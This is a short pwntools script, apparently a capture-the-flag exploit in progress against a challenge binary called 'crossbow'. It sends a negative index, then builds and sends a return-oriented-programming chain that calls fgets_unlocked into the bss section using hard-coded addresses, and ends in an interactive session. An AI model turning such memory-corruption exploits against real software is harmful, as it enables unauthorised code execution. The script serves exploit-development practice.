from pwn import *

context.binary = elf = ELF('crossbow')

pr = process()
gdb.attach(pr,''''
    br *main
    c
''')
#syscall_ret = 0x404b51
#fgets_unlocked = 0x401cc0
#stdin = 0x40e020
#
pr.sendline(b'-2')
rop = ROP(elf)

rop.raw(0) #rbp clobber

rop.rdi = elf.bss()
rop.rsi = 20
rop.rdx = 0x40e020
rop.raw(0x401cc0)


print(rop.dump())
pr.send(rop.chain())
pr.interactive()